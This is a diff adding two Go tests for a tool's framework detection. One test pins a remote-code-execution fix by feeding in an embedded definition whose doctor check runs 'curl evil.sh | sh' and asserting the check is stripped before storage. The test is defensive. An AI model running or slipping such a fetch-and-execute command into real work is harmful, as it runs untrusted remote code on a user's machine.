@@ -134,3 +134,69 @@ func TestDetectFrameworkForDir_LerdYAML_UnknownFramework(t *testing.T) {
 		t.Error("should not detect a framework that doesn't exist anywhere")
 	}
 }
+
+// TestDetectFrameworkForDir_StripsUntrustedCommandCheck pins the framework_def RCE
+// fix at the store boundary: restoring an embedded def with a command-type doctor
+// check must write a sanitised copy (no command check) into the store, so the site
+// doctor never runs the attacker's command on the host.
+func TestDetectFrameworkForDir_StripsUntrustedCommandCheck(t *testing.T) {
+	setConfigDir(t)
+	dir := t.TempDir()
+
+	proj := &ProjectConfig{
+		Framework: "acme",
+		FrameworkDef: &Framework{
+			Name:   "acme",
+			Detect: []FrameworkRule{{File: "acme.lock"}},
+			Doctor: &FrameworkDoctor{Checks: []DoctorCheck{
+				{Name: "pwn", Type: "command", Command: "curl evil.sh | sh"},
+			}},
+		},
+	}
+	data, _ := yaml.Marshal(proj)
+	os.WriteFile(filepath.Join(dir, ".lerd.yaml"), data, 0644) //nolint:errcheck
+
+	if _, ok := DetectFrameworkForDir(dir); !ok {
+		t.Fatal("expected framework to be detected from embedded def")
+	}
+
+	stored := loadFrameworkYAML(filepath.Join(StoreFrameworksDir(), "acme.yaml"))
+	if stored == nil {
+		t.Fatal("embedded def should have been saved to the store")
+	}
+	if stored.Doctor != nil {
+		t.Errorf("command doctor check must be stripped before store import, got %+v", stored.Doctor)
+	}
+}
+
+// TestDetectFrameworkForDir_ReimportsEditedEmbeddedDef pins that the committed
+// framework_def stays the source of truth: editing an inert field (here the public
+// dir) propagates to the store on the next detection rather than going stale.
+func TestDetectFrameworkForDir_ReimportsEditedEmbeddedDef(t *testing.T) {
+	// Separate config and data homes so the seeded store file is a store entry, not
+	// a user overlay (the overlay would win and short-circuit the re-import).
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	t.Setenv("XDG_DATA_HOME", t.TempDir())
+	dir := t.TempDir()
+
+	storeDir := StoreFrameworksDir()
+	os.MkdirAll(storeDir, 0755) //nolint:errcheck
+	stale := &Framework{Name: "acme", PublicDir: "public", Detect: []FrameworkRule{{File: "acme.lock"}}}
+	sData, _ := yaml.Marshal(stale)
+	os.WriteFile(filepath.Join(storeDir, "acme.yaml"), sData, 0644) //nolint:errcheck
+
+	proj := &ProjectConfig{
+		Framework:    "acme",
+		FrameworkDef: &Framework{Name: "acme", PublicDir: "web", Detect: []FrameworkRule{{File: "acme.lock"}}},
+	}
+	data, _ := yaml.Marshal(proj)
+	os.WriteFile(filepath.Join(dir, ".lerd.yaml"), data, 0644) //nolint:errcheck
+
+	if _, ok := DetectFrameworkForDir(dir); !ok {
+		t.Fatal("expected framework to be detected")
+	}
+	stored := loadFrameworkYAML(filepath.Join(storeDir, "acme.yaml"))
+	if stored == nil || stored.PublicDir != "web" {
+		t.Fatalf("edited embedded def should refresh the store, got %+v", stored)
+	}
+}
